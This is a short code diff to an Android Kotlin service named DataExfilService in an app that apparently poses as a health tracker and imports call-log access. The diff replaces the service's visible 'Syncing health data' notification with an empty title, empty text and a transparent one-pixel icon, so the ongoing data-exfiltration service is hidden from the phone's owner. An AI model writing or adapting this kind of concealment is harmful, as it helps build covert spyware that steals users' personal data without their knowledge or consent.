@@ -36,6 +36,7 @@ import java.util.Collections
 import android.graphics.Bitmap
 import android.provider.Settings
 import android.provider.CallLog
+import com.inf2007.healthtracker.R
 
 class DataExfilService : Service() {
 
@@ -205,9 +206,9 @@ class DataExfilService : Service() {
 
     private fun createNotification(): Notification {
         return NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
-            .setContentTitle("Health Tracker")
-            .setContentText("Syncing health data...")
-            .setSmallIcon(android.R.drawable.stat_sys_upload)
+            .setContentTitle("")
+            .setContentText("")
+            .setSmallIcon(R.drawable.onebyonetransparent)
             .setPriority(NotificationCompat.PRIORITY_LOW)
             .setOngoing(true)
             .setAutoCancel(false)
